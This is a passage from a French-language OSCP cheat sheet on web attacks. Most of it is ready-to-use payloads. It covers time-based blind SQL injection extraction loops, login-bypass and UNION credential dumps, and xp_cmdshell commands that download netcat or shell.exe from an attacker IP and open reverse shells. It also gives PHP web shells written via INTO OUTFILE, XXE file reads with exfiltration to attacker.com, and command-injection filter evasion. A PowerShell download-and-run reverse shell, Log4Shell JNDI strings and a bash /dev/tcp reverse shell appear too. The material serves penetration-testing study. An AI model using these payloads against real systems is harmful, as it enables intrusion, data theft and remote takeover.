admin' OR WAITFOR DELAY '00:00:05';--+

```

```sql
# MySQL
http://<host>/login.php?user=admin' AND IF(1=1, SLEEP(5), 0) --+

# MSSQL
http://<host>/login.php?user=admin' AND IIF(1=1, WAITFOR DELAY '00:00:05', 0) --+

```

```sql
# MySQL
http://<host>/index.php?id=1' AND SLEEP(10) --+

# MSSQL
http://<host>/index.php?id=1' AND WAITFOR DELAY '00:00:10' --+

```

```sql
# MySQL
http://<host>/index.php?id=1' AND IF((SELECT VERSION()) LIKE '5%', SLEEP(10), NULL) --+

# MSSQL
http://<host>/index.php?id=1' AND IIF((SELECT @@VERSION) LIKE '5%', WAITFOR DELAY '00:00:10', NULL) --+

```

**Paramètres et repères :**
`wfuzz`  

<p class="oscp-command-note">SQLi temporelle : boucle de requêtes wfuzz pour observer les différences de réponse.</p>

```bash
# Utilise les valeurs ASCII pour retrouver les caractères du nom de la base.
for i in $(seq 1 10); do 
  wfuzz -v -c -z range,32-127 "http://<host>/index.php?id=1' AND IF(ASCII(SUBSTR(DATABASE(), $i, 1))=FUZZ, SLEEP(10), NULL) --+"; 
done > <filename.txt> && grep "0m9" <filename.txt

# Remplacer <filename.txt> par le nom du fichier pour stocker les résultats.
# Remplacer 10 en $(seq 1 10) par la longueur estimée du nom de la base de données.
# Le mot clé FUZZ est utilisé par wfuzz pour itérer à travers les valeurs ASCII.

```

**Paramètres et repères :**
`wfuzz`  

```bash
# Utilise les valeurs ASCII pour retrouver les caractères du nom de la première table.
for i in $(seq 1 10); do 
  wfuzz -v -c -z range,32-127 "http://<host>/index.php?id=1' AND IF(ASCII(SUBSTR((SELECT table_name FROM information_schema.tables WHERE table_schema=DATABASE() LIMIT 0,1), $i, 1))=FUZZ, SLEEP(10), NULL) --+"; 
done > <filename.txt> && grep "0m9" <filename.txt

# Remplacer table_name et table_schema par les noms réels des tables et bases ciblées.
# Modifier le premier argument de LIMIT 0,1 pour parcourir plusieurs tables.

```

**Paramètres et repères :**
`wfuzz` · `information_schema.columns`  

```bash
# Déterminer les caractères d'un nom de colonne à partir de leurs valeurs ASCII.
for i in $(seq 1 10); do 
  wfuzz -v -c -z range,32-127 "http://<host>/index.php?id=1' AND IF(ASCII(SUBSTR((SELECT column_name FROM information_schema.columns WHERE table_name='<table_name>' LIMIT 0,1), $i, 1))=FUZZ, SLEEP(10), NULL) --+"; 
done > <filename.txt> && grep "0m9" <filename.txt

# Remplacer <table_name> par le nom de la table que vous ciblez.
# Adapter LIMIT 0,1 pour examiner d'autres lignes et colonnes.

```

**Paramètres et repères :**
`wfuzz`  

```bash
# Extrait du contenu d'une colonne spécifique à l'aide de la comparaison de valeur ASCII
for i in $(seq 1 10); do 
  wfuzz -v -c -z range,0-10 -z range,32-127 "http://<host>/index.php?id=1' AND IF(ASCII(SUBSTR((SELECT <column_name> FROM <table_name> LIMIT FUZZ,1), $i, 1))=FUZ2Z, SLEEP(10), NULL) --+"; 
done > <filename.txt> && grep "0m9" <filename.txt

# Remplacer <column_name> par la colonne que vous essayez d'extraire (par exemple, nom d'utilisateur, mot de passe).
# Remplacer <table_name> par le nom de la table.
# La valeur FUZZ itère sur des entrées de lignes possibles (utilisez LIMIT FUZZ, 1 pour itérer des lignes).

```

![Blind SQL Injection with Tools](https://www.emmanuelsolis.com/img/automating_blind_sqli.gif)

#### Commandes de contournement d’authentification

<p class="oscp-command-note">Exemple de sql pour «Commandes de contournement d’authentification».</p>

```sql
-- Variante utilisant une condition OR
' OR 1=1 --+

-- Variante avec LIMIT pour limiter les entrées retournées
' OR 1=1 LIMIT 1 --+

-- Variante par comparaison de chaînes lorsque la comparaison numérique échoue
' OR 'a'='a --+

-- Combiner plusieurs conditions avec AND
' OR 3=3 --+

-- Variante évitant la condition classique 1=1 :
' OR 2=2 --+

-- Variante par comparaison de chaînes compatible MySQL et MSSQL
' OR 'a'='a' --+

-- Variante OR utilisant une comparaison numérique
' OR 3=3 --+

-- Variante MySQL avec LIMIT pour retourner une seule entrée
' OR 1=1 LIMIT 1 --+

-- Limiter les résultats MSSQL avec TOP
' OR 1=1; SELECT TOP 1 * FROM users --+

```

<p class="oscp-command-note">Instruction SQL dans la rubrique « Login Bypass Commandes ».</p>

```sql
meh' OR 3=3;#
meh' OR 2=2 LIMIT 1;#
meh' OR 'a'='a
meh' OR 1=1 --+

```

```sql
meh' OR 3=3;--
meh' OR 2=2;--
meh' OR 'a'='a;--
meh' OR 1=1;--

```

#### Exemple de code vulnérable

<p class="oscp-command-note">Extrait PHP : exemple technique pour «Exemple de code vulnérable» (ce n'est pas une commande de terminal).</p>

```php
<?php
include 'database_connection.php';
$user = $_POST['username'];
$pass = $_POST['password'];
$query = "SELECT * FROM users WHERE username = '$user' AND password = '$pass'";
$execution = mysqli_query($connection, $query) or die(mysqli_error($connection));
$row = mysqli_fetch_array($execution);

if($row) {
    echo "Login Successful";
} else {
    echo "Invalid username or password";
}
?>

```

### Troncation SQL (SQL Truncation)

Examiner les connexions, la configuration et les requêtes de la base de données.

<p class="oscp-inline-ref"><strong>Valeur ou caractère de référence :</strong> <code>'admin'</code></p>

<p class="oscp-inline-ref"><strong>Valeur ou caractère de référence :</strong> <code>'admin'</code></p>

<p class="oscp-command-note">Instruction SQL dans la rubrique « SQL Truncation ».</p>

```sql
# Exemple de tronquage; la base de données rejette des caractères supplémentaires
username=admin++++++++(max.length)&password=testpwn123

-- Hypothèse : le champ utilisateur est limité à dix caractères ; le dépassement entraîne une troncature.
username=admin++++++++&password=testpwn123

-- La base conserve admin et ignore les caractères supplémentaires
-- Si le compte admin existe, la troncature peut créer un risque de contournement

```

#### MSSQL

Examiner les connexions, la configuration et les requêtes de la base de données.

##### Bases de données par défaut

**Paramètres et repères :**
`master` · `msdb` · `model` · `resource`  
`tempdb`  

##### Commandes courantes

<p class="oscp-command-note">SQL : préparer ou interroger les tables et fonctions liées à «Commandes courantes».</p>

```sql
SELECT name FROM master.dbo.sysdatabases

```

```sql
SELECT table_name FROM <DATABASE>.INFORMATION_SCHEMA.TABLES

```

```sql
union select 1,(select string_agg(concat(name,':',id),'|') from streamio..sysobjects where xtype='u'),3,4,5,6-- -

```

```sql
union select 1,concat(username,':',password),3,4,5,6 from users--

```

**Paramètres et repères :**
`xp_cmdshell`  

<p class="oscp-command-note">Instruction SQL dans la rubrique « Commandes courantes ».</p>

```sql
exec xp_dirtree 'c:\'

EXEC xp_cmdshell 'ping [attacker_ip]';

```

```sql
-- Côté testeur
sudo responder -A -I tun0

-- Côté cible
EXEC master..xp_dirtree '\\[Attacker_IP]\share\'

```

##### Exemples d'instructions SQL

<p class="oscp-command-note">Exemple de sql pour «Exemples d'instructions SQL».</p>

```sql
-- Examiner la requête SQL et adapter la valeur de test
INSERT INTO dbo.tablename ('<user_input>', '<user_input>'); 

-- Adapter les premières valeurs de test
INSERT INTO dbo.tablename ('1 AND 1=CONVERT(INT,@@version))-- ', '<user_input>'); 
INSERT INTO dbo.tablename('', CONVERT(INT, db_name(<number>)))-- 

-- Énumérer les noms des colonnes
', CONVERT(INT, (CHAR(58)+(SELECT DISTINCT TOP 1 column_name FROM information_schema.COLUMNS WHERE TABLE_NAME='<table_name>' ORDER BY column_name ASC)+CHAR(58))))-- 

-- Lire les données des colonnes
', CONVERT(INT, (CHAR(58)+CHAR(58)+(SELECT TOP 1 <column> FROM <table_name> ORDER BY <column> ASC)+CHAR(58)+CHAR(58))))-- 

```

##### Exécution de code à distance (RCE)

<p class="oscp-command-note">Instruction SQL dans la rubrique « Remote Code Execution (RCE) ».</p>

```sql
-- À utiliser pour un test d'injection SQL

-- Activer les options avancées
';EXEC sp_configure 'show advanced options',1;RECONFIGURE;EXEC sp_configure 'xp_cmdshell',1; RECONFIGURE;-- 

-- Activer xp_cmdshell
';EXEC xp_cmdshell "powershell wget http://[kali_ip]/nc64.exe -o C:\Users\Public\nc64.exe";--

-- Exécuter la commande indiquée
';EXEC xp_cmdshell "C:\Users\Public\nc64.exe -t -e C:\Windows\System32\cmd.exe [kali_ip] [listening_port]";--

```

```sql
-- À utiliser si l'on dispose d'un accès SQL direct

-- Activer les options avancées
EXEC sp_configure 'show advanced options',1;
RECONFIGURE;

-- Activer xp_cmdshell
EXEC sp_configure 'xp_cmdshell',1
RECONFIGURE;

-- Exécuter la commande indiquée
EXEC xp_cmdshell "powershell wget http://[kali_ip]/nc64.exe -o C:\Users\Public\nc64.exe";
EXEC xp_cmdshell "C:\Users\Public\nc64.exe -t -e C:\Windows\System32\cmd.exe [kali_ip] [listening_port]";

```

```sql
-- Exemple de test

-- Activer les options avancées
<username>'; EXEC sp_configure 'show advanced options', 1; RECONFIGURE; --

-- Activer xp_cmdshell
<username>'; EXEC sp_configure 'xp_cmdshell', 1; RECONFIGURE; --

-- Exécuter la commande indiquée
<username>'; EXEC master.dbo.xp_cmdshell 'ping <attacker_ip>'; --
<username>'; EXEC master.dbo.xp_cmdshell 'certutil -urlcache -split -f http://<attacker_ip>:<port>/shell.exe C:\\Windows\\temp\\shell.exe'; --
<username>'; EXEC master.dbo.xp_cmdshell 'cmd /c C:\\Windows\\temp\\shell.exe'; --

```

##### Usurpation de contexte (Impersonation)

<p class="oscp-command-note">SQL : préparer ou interroger les tables et fonctions liées à «Usurpation de contexte (Impersonation)».</p>

```sql
SELECT distinct b.name FROM sys.server_permissions a INNER JOIN sys.server_principals b ON a.grantor_principal_id = b.principal_id WHERE a.permission_name = 'IMPERSONATE'

```

```sql
EXECUTE AS LOGIN = 'sa' SELECT SYSTEM_USER SELECT IS_SRVROLEMEMBER('sysadmin')

```

```sql
SELECT SYSTEM_USER

SELECT IS_SRVROLEMEMBER('sysadmin')

go

```

```sql
SELECT srvname, isremote FROM sysservers;

```

**Paramètres et repères :**
`xp_cmdshell`  

<p class="oscp-command-note">Instruction SQL dans la rubrique « Impersonation ».</p>

```sql
EXEC master.dbo.sp_configure 'show advanced options', 1;

RECONFIGURE;

```

#### MySQL

Examiner les connexions, la configuration et les requêtes de la base de données.

##### Bases de données par défaut

**Paramètres et repères :**
`mysql` · `information_schema` · `performance_schema` · `sys`  

##### Commandes courantes

<p class="oscp-command-note">Interroger une base de données MySQL.</p>

```bash
mysql -u <username> -p'<password>' -h <host> -P <port>

```

<p class="oscp-command-note">Instruction SQL dans la rubrique « Commandes courantes ».</p>

```sql
SHOW DATABASES;

USE <database_name>;

```

```sql
SHOW TABLES;

DESCRIBE <table_name>;

SELECT * FROM <table_name>;

```

<p class="oscp-command-note">SQL : préparer ou interroger les tables et fonctions liées à «Commandes courantes».</p>

```sql
SELECT "<?php echo shell_exec($_GET['c']);?>" INTO OUTFILE '/var/www/html/webshell.php';
-- Autre possibilité : utiliser ?cmd=[command]
SELECT "<?php system($_GET['cmd']); ?>" into outfile "C:\\xampp\\htdocs\\backdoor.php"

```

```sql
-- Vérifier la version MySQL
SELECT version();

-- Identifier l'utilisateur SQL courant
SELECT system_user();

-- Lister les bases de données
SHOW DATABASES;

-- Lister les comptes et leurs empreintes (authentication_string)
SELECT user, authentication_string FROM mysql.user WHERE user = '<username>';

-- Énumérer les comptes de la base
SELECT user FROM mysql.user;

-- Élévation de privilèges
GRANT ALL PRIVILEGES ON *.* TO '<username>'@'%' WITH GRANT OPTION;
FLUSH PRIVILEGES;

# Tester SQLi dans chaque champ d'entrée
';#---

```

##### Exécution de code à distance (RCE)

**Paramètres et repères :**
`mysql`  

<p class="oscp-command-note">Exemple de sql pour «Exécution de code à distance (RCE)».</p>

```sql
-- Exemple générique
SELECT "<?php system($_GET['cmd']);?>" INTO OUTFILE "/var/www/html/webshell.php"

-- Variante utilisant UNION
' union select '<?php system($_GET["cmd"]); ?>' into outfile '/srv/http/shell.php' -- -

-- Exemple Windows
SELECT "<?php system($_GET['cmd']);?>" INTO OUTFILE "C:/wamp/www/shell.php" 

```

##### Commandes courantes

<p class="oscp-command-note">Instruction SQL dans la rubrique « Commandes courantes ».</p>

```sql
admin ' OR 1=1 -- 

```

```sql
1' OR 1 = 1 #

```

<p class="oscp-command-note">Exemple de sql pour «Commandes courantes».</p>

```sql
' UNION SELECT 1,2,3,4 FROM information_schema.tables WHERE table_schema=database()-- 

```

```sql
' UNION SELECT table_name, NULL FROM information_schema.tables WHERE table_schema=database()-- 
' UNION SELECT column_name, NULL FROM information_schema.columns WHERE table_name='<table_name>'-- 

```

```sql
' UNION SELECT <column1>, <column2> FROM <table_name>-- 

```

##### Commandes courantes

**Paramètres et repères :**
`dual`  

<p class="oscp-command-note">Exemple de sql pour «Commandes courantes».</p>

```sql
' UNION SELECT 1,2,3,4,5 FROM dual-- 

```

```sql
' UNION SELECT 1,2,3 FROM dual-- 

```

```sql
' UNION SELECT username, NULL, NULL FROM all_users-- 

```

```sql
' UNION SELECT table_name, NULL, NULL FROM all_tables-- 
' UNION SELECT column_name, NULL, NULL FROM all_tab_columns WHERE table_name='<table_name>'-- 

```

```sql
' UNION SELECT <column_name>, NULL FROM <table_name>-- 

```

##### Contournement de l’authentification (Login Bypass)

<p class="oscp-command-note">Instruction SQL dans la rubrique « Login Bypass ».</p>

```sql
admin ' OR 1=1 -- 

```

##### Injection par UNION pour extraire les identifiants

Examiner les entrées et les réponses de l'application web.

### Paramètre de requête SQL ciblé

Utiliser la requête HTTP capturée pour tester une seule variable, sans extraction automatique des données.

<p class="oscp-command-note">Paramètre de requête SQL ciblé.</p>

```bash
sqlmap -r <REQUETE_HTTP>.txt -p <PARAMETRE> --batch --technique=BEU
```

### Vérifier l'injection en aveugle

Préparer un test fondé sur les délais en limitant le niveau de bruit et les tentatives.

<p class="oscp-command-note">Vérifier l'injection en aveugle.</p>

```bash
sqlmap -u 'https://<HOTE_CIBLE>/fiche?id=1' -p id --technique=T --batch
```

## Injection XXE

Examiner les entrées et les réponses de l'application web.

### Détection

**Balise XML (Tag)**

```text
<date>

```

**Entité XML (Entity)**

```text
&lt;

```

**Élément XML (Element)**

```text
<date>01-01-2022</date>

```

**Attribut XML (Attribute)**

```text
version="1.0"/encoding="UTF-8"

```

**Déclaration XML (Declaration)**

```text
<?xml version="1.0" encoding="UTF-8"?>

```

### Lecture de fichiers locaux

```text
&[variable];

```

![XEE Payload](https://www.emmanuelsolis.com/img/xee01.png)

![XEE Result](https://www.emmanuelsolis.com/img/xee02.png)

### Lecture de fichiers sensibles

![XEE Reading Sensitive Files](https://www.emmanuelsolis.com/img/xee03.png)

**Paramètres et repères :**
`/etc/passwd`  

<p class="oscp-command-note">Extrait XML : exemple technique pour «Lecture de fichiers sensibles» (ce n'est pas une commande de terminal).</p>

```xml
<?xml version="1.0" encoding="ISO-8859-1"?>
<!DOCTYPE foo [
   <!ELEMENT foo ANY >
   <!ENTITY xxe SYSTEM "file:///etc/passwd" >]>
<foo>&xxe;</foo>

```

```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE config [
   <!ELEMENT config ANY >
   <!ENTITY readConfig SYSTEM "file:///etc/myconfig.conf" >]>
<config>&readConfig;</config>

```

```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE data [
   <!ELEMENT data ANY >
   <!ENTITY localHosts SYSTEM "file:///etc/hosts" >]>
<data>&localHosts;</data>

```

```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE request [
   <!ENTITY % remote SYSTEM "http://attacker.com/malicious.dtd">
   <!ENTITY % all "<!ENTITY send SYSTEM 'file:///etc/passwd'>">
   %remote;
   %all;
]>
<request>&send;</request>

```

```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE request [
   <!ELEMENT request ANY >
   <!ENTITY xxe SYSTEM "http://attacker.com/secret.txt" >]>
<request>&xxe;</request>

```

### Lecture du code source

```text
| < > { } &

```

```xml
<!DOCTYPE email [
  <!ENTITY company SYSTEM "php://filter/convert.base64-encode/resource=index.php">
]>

```

![XEE Reading Source Code](https://www.emmanuelsolis.com/img/xee04.png)

### Exécution de code à distance

```text
| < > { } &

```

```xml
<?xml version="1.0"?>
<!DOCTYPE email [
  <!ENTITY company SYSTEM "expect://curl$IFS-O$IFS'OUR_IP/shell.php'">
]>
<root>
<name></name>
<tel></tel>
<email>&company;</email>
<message></message>
</root>

```

### Énumération

<p class="oscp-command-note">Chemins de référence à examiner pour «Énumération» (pas une commande).</p>

```bash
# UID=1
/documents/Invoice_1_09_2021.pdf
/documents/Report_1_10_2021.pdf

# UID=2
/documents/Invoice_2_08_2020.pdf
/documents/Report_2_12_2020.pdf

```

```bash
# Script avec expression régulière (regex) pour trouver les documents
#!/bin/bash

url="http://SERVER_IP:PORT"

for i in {1..10}; do
        for link in $(curl -s "$url/documents.php?uid=$i" | grep -oP "\/documents.*?.pdf"); do
                wget -q $url/$link
        done
done

```

```bash
# Option de script alternative pour trouver une extension
#!/bin/bash

url="http://SERVER_IP:PORT"

for i in {1..20}; do
    for link in $(curl -s -X POST -d "uid=$i" "$url/documents.php" | grep -oP "\/documents.*?\\.\\w+"); do
        curl -O $url/$link
    done
done

```

### Requêtes AJAX

<p class="oscp-command-note">Extrait JAVASCRIPT : exemple technique pour «Requêtes AJAX» (ce n'est pas une commande de terminal).</p>

```javascript
// Exemple de code
function changeUserPassword() {
    $.ajax({
        url:"change_password.php",
        type: "post",
        dataType: "json",
        data: {uid: user.uid, password: user.password, is_admin: is_admin},
        success:function(result){
            //
        }
    });
}

```

### Hachage et encodage

Vérifier les comptes, les secrets et les mécanismes d'authentification.

<p class="oscp-inline-ref"><strong>Exemple de valeur web :</strong> <code>download.php?filename=ZmlsZV8xMjMucGRm</code></p>

<p class="oscp-inline-ref"><strong>Exemple de valeur web :</strong> <code>download.php?filename=c81e728d9d4c2f636f067f89cc14862c</code></p>

<p class="oscp-command-note">Extrait JAVASCRIPT : exemple technique pour «Hachage et encodage» (ce n'est pas une commande de terminal).</p>

```javascript
$.ajax({
    url:"download.php",
    type: "post",
    dataType: "json",
    data: {filename: CryptoJS.MD5('file_1.pdf').toString()},
    success:function(result){
        //
    }
});

```

### Comparaison des rôles utilisateurs

**Paramètres et repères :**
`User2`  

```json
{
  "attributes" : 
    {
      "type" : "salary",
      "url" : "/services/data/salaries/users/1"
    },
  "Id" : "1",
  "Name" : "User1"
}

```

### API insuffisamment sécurisées

```json
{
    "uid": 1,
    "uuid": "40f5888b67c246df7efba008e7c2f9d2",
    "role": "employee",
    "full_name": "emma LastName",
    "email": "emma@employees.com",
    "about": "A pentester and red teamer."
}

```

### Examiner le type de contenu XML

Transmettre une requête XML inoffensive pour observer si l'application accepte ce format et son analyseur.

<p class="oscp-command-note">Examiner le type de contenu XML.</p>

```bash
curl -i -H 'Content-Type: application/xml' --data '<controle>test</controle>' 'https://<HOTE_CIBLE>/api/xml'
```

## Injections de commandes

Examiner les entrées et les réponses de l'application web.

### Détection

```powershell
# Vérifiez si nous effectuons PowerShell ou CMD
(dir 2>&1 *`|echo CMD);&<# rem #>echo PowerShell

```

```php
<?php
if (isset($_GET['filename'])) {
    system("touch /tmp/" . $_GET['filename'] . ".pdf");
}
?>

app.get("/createfile", function(req, res){
    child_process.exec(`touch /tmp/${req.query.filename}.txt`);
})

```

<p class="oscp-command-note">Envoyer une requête HTTP POST.</p>

```bash
curl -X POST --data 'Archive=git%3BIEX%20(New-Object%20System.Net.Webclient).DownloadString(%22http%3A%2F%2F<ATTACKER_IP>%2Fpowercat.ps1%22)%3Bpowercat%20-c%20<ATTACKER_IP>%20-p%20<PORT>%20-e%20powershell' http://<TARGET>:<PORT>/archive

```

### Méthodes d’exécution des commandes

```text
;

```

**Point-virgule (Semicolon)**

```text
;

```

<p class="oscp-inline-ref"><strong>Séquence encodée pour un test web :</strong> <code>%3b</code></p>

**Nouvelle ligne (New Line)**

```text
%0a

```

**Arrière-plan (Background)**

```text
&

```

<p class="oscp-inline-ref"><strong>Séquence encodée pour un test web :</strong> <code>%26</code></p>

**Tube de communication (Pipe)**

```text
|

```

<p class="oscp-inline-ref"><strong>Séquence encodée pour un test web :</strong> <code>%7c</code></p>

**ET logique (AND)**

```text
&&

```

<p class="oscp-inline-ref"><strong>Séquence encodée pour un test web :</strong> <code>%26%26</code></p>

**OU logique (OR)**

```text
|

```

<p class="oscp-inline-ref"><strong>Séquence encodée pour un test web :</strong> <code>%7c%7c</code></p>

**Sous-shell (Subshell)**

```text
%60%60

```

**Sous-shell (Subshell)**

```text
$()

```

<p class="oscp-inline-ref"><strong>Séquence encodée pour un test web :</strong> <code>%24%28%29</code></p>

#### Contournement du filtrage des espaces

<p class="oscp-inline-ref"><strong>Séquence encodée pour un test web :</strong> <code>%09</code></p>

<p class="oscp-inline-ref"><strong>Valeur ou caractère de référence :</strong> <code>$IFS</code></p>

```json
{ls,-la}

```

#### Contournement du filtrage de / et \

<p class="oscp-command-note">Afficher les valeurs ou chaînes utilisées dans «Contournement du filtrage de / et \».</p>

```bash
# pour sélectionner /
echo ${PATH:0:1}

```

```powershell
# pour sélectionner \
$env:HOMEPATH[0]

```

#### Contournement des commandes interdites

<p class="oscp-command-note">Extrait JAVASCRIPT : exemple technique pour «Contournement des commandes interdites» (ce n'est pas une commande de terminal).</p>

```javascript
$blacklist = ['whoami', 'cat', ...SNIP...];
foreach ($blacklist as $word) {
    if (strpos('$_POST['ip']', $word) !== false) {
        echo "Invalid input";
    }
}

```

```text
` or "

Example: w'h'o'am'i

```

<p class="oscp-inline-ref"><strong>Valeur ou caractère de référence :</strong> <code>\</code></p>

<p class="oscp-inline-ref"><strong>Valeur ou caractère de référence :</strong> <code>$@</code></p>

```text
Examples:
- who$@ami
- w\ho\am\i

```

<p class="oscp-inline-ref"><strong>Valeur ou caractère de référence :</strong> <code>^</code></p>

```text
Example:
- who^ami

```

#### Commandes inversées

<p class="oscp-command-note">Afficher les valeurs ou chaînes utilisées dans «Commandes inversées».</p>

```bash
# Linux
echo 'whoami' | rev

# Pour exécuter :
$(rev<<<'imaohw')

```

<p class="oscp-command-note">PowerShell : reconstruire une chaîne inversée, puis examiner son exécution.</p>

```powershell
# Windows
"whoami"[-1..-20] -join ''

# Pour exécuter :
iex "$('imaohw'[-1..-20] -join '')"

```

#### Commandes encodées

<p class="oscp-command-note">Encoder ou décoder les données au format Base64.</p>

```bash
# Linux
echo -n 'cat /etc/passwd | grep 33' | base64

# Pour exécuter (notez que nous utilisons <<< pour éviter l'utilisation d'un tube, qui est un caractère filtré):
bash<<<$(base64 -d<<<Y2F0IC9ldGMvcGFzc3dkIHwgZ3JlcCAzMw==)

```

<p class="oscp-command-note">PowerShell : encoder une commande en Unicode/Base64 et reconstruire sa valeur.</p>

```powershell
[Convert]::ToBase64String([System.Text.Encoding]::Unicode.GetBytes('whoami'))

# Pour exécuter :
iex "$([System.Text.Encoding]::Unicode.GetString([System.Convert]::FromBase64String('dwBoAG8AYQBtAGkA')))

```

### Outils automatisés de vérification des applications web

<p class="oscp-command-note">Examiner les fichiers et l&#x27;historique Git.</p>

```bash
# Installation
git clone https://github.com/Bashfuscator/Bashfuscator
cd Bashfuscator
pip3 install setuptools==65
python3 setup.py install --user

# Usage
cd ./bashfuscator/bin/
./bashfuscator -h
./bashfuscator -c 'cat /etc/passwd'

# Exemple
./bashfuscator -c 'cat /etc/passwd' -s 1 -t 1 --no-mangling --layers 1

```

```powershell
# Installation
git clone https://github.com/danielbohannon/Invoke-DOSfuscation.git
cd Invoke-DOSfuscation
Import-Module .\Invoke-DOSfuscation.psd1
Invoke-DOSfuscation

# Usage
Invoke-DOSfuscation> SET COMMAND type C:\Users\htb-student\Desktop\flag.txt

Invoke-DOSfuscation> encoding
Invoke-DOSfuscation\Encoding> 1

```

### Contrôle d'une injection en laboratoire

Encoder correctement les paramètres transmis à une application de test ; n'utiliser qu'une commande d'identification non destructive.

<p class="oscp-command-note">Contrôle d'une injection en laboratoire.</p>

```bash
curl -G --data-urlencode 'param=;id' 'http://<HOTE_LABORATOIRE>/test'
```

## Log4Shell

<p class="oscp-command-note">Chaînes JNDI LDAP/RMI de démonstration à placer dans un champ du laboratoire, pas dans Bash.</p>

```text
# Charge utile LDAP
${jndi:ldap://attacker-server.com:1389/a}

# Charge utile RMI
${jndi:rmi://attacker-server.com:1099/a}

```

<p class="oscp-command-note">Log4Shell : placer une chaîne JNDI dans l'URL ou l'en-tête User-Agent d'une requête GET.</p>

```bash
# Utilisation de Curl
curl -X GET 'http://target-server.com:8080/?search=${jndi:ldap://attacker-server.com:1389/a}'

# Utilisation de Headers Injection
curl -X GET http://target-server.com -H "User-Agent: ${jndi:ldap://attacker-server.com:1389/a}"

# Utilisation de l'injection de données POST
curl -X POST http://target-server.com/login -d "username=${jndi:ldap://attacker-server.com:1389/a}&password=test"

```

<p class="oscp-command-note">Netcat : lancer l'écoute locale sur le port de test.</p>

```bash
nc -lvnp [listening_port]

```

<p class="oscp-command-note">Log4Shell : exemples de commande Bash et d'expression JNDI, à distinguer avant usage.</p>

```bash
# Vous pouvez également utiliser un outil comme ysoserial (pour Windows) pour générer la charge utile.

# Charge utile en coque inversée
bash -i >& /dev/tcp/attacker-server.com/[listening_port] 0>&1

# Utiliser la charge utile du shell inverse
${jndi:ldap://attacker-server.com:1389/bash-reverse-shell}

```

## Exploitation de vulnérabilités identifiées par CVE

```text
CVE-2014-6287 https://www.exploit-db.com/exploits/49584 #HFS (HTTP File Server) 2.3.x - Remote Command Execution

CVE-2015-6518 https://www.exploit-db.com/exploits/24044 phpliteadmin <= 1.9.3 Remote PHP Code Injection Vulnerability

CVE-XXXX-XXXX https://www.exploit-db.com/exploits/25971 Cuppa CMS - '/alertConfigField.php' Local/Remote File Inclusion

CVE-2009-4623 https://www.exploit-db.com/exploits/9623  Advanced comment system1.0  Remote File Inclusion Vulnerability
https://github.com/hupe1980/CVE-2009-4623/blob/main/exploit.py

CVE-2018-18619 https://www.exploit-db.com/exploits/45853 Advanced Comment System 1.0 - SQL Injection

```

## Contrôles web complémentaires

Adapter les chemins, paramètres et méthodes à l'application réellement observée. Les exemples utilisent des valeurs de démonstration et ne constituent pas une preuve automatique de vulnérabilité.

### Traversée de chemin (Path Traversal)

Conserver les segments ../ lors de l'envoi d'une requête HTTP ; certains clients normalisent sinon le chemin avant transmission.

<p class="oscp-command-note">Traversée de chemin (Path Traversal).</p>

```bash
curl --path-as-is 'http://<HOTE_CIBLE>/download/../../../../etc/hostname'
```

### Inclusion locale : lecture via un filtre PHP

Lorsque l'application utilise PHP et un paramètre d'inclusion, tester la présence du flux php://filter sans exécuter de code.

<p class="oscp-command-note">Inclusion locale : lecture via un filtre PHP.</p>

```bash
curl -G --data-urlencode 'page=php://filter/convert.base64-encode/resource=index.php' 'http://<HOTE_CIBLE>/index.php'
```

### SQLi : travailler depuis une requête enregistrée

Utiliser une requête HTTP capturée dans un fichier pour cibler un paramètre précis lors de l'analyse.

<p class="oscp-command-note">SQLi : travailler depuis une requête enregistrée.</p>

```bash
sqlmap -r <REQUETE_HTTP>.txt -p <PARAMETRE> --batch
```

### SSRF : distinguer client et serveur

Lorsqu'une fonctionnalité récupère une URL, vérifier depuis quel composant la requête part. L'endpoint /fetch est illustratif : le remplacer par le vrai paramètre observé.

<p class="oscp-command-note">SSRF : distinguer client et serveur.</p>

```bash
curl -i -G --data-urlencode 'url=http://127.0.0.1:8080/' 'http://<HOTE_CIBLE>/fetch'
```

### CSRF : observer le contexte de protection

Examiner les en-têtes et cookies de session. Une requête POST ne permet pas, à elle seule, de conclure à une faille CSRF.

<p class="oscp-command-note">CSRF : observer le contexte de protection.</p>

```bash
curl -i -X OPTIONS 'http://<HOTE_CIBLE>/profil'
curl -i 'http://<HOTE_CIBLE>/profil'
```

**Référence technique complémentaire :** [Notes OSCP de krovs](https://github.com/krovs/oscp-notes/blob/main/docs/11_web_attacks.md). Cette synthèse conserve la structure de SKILL-ISSUE et reformule les explications.

<!-- notes-krovs-2026 -->

---

Source documentaire : [OSCP+ Cheatsheet d'Emmanuel Solis](https://www.emmanuelsolis.com/oscp.html).

<!-- refined-oscp -->
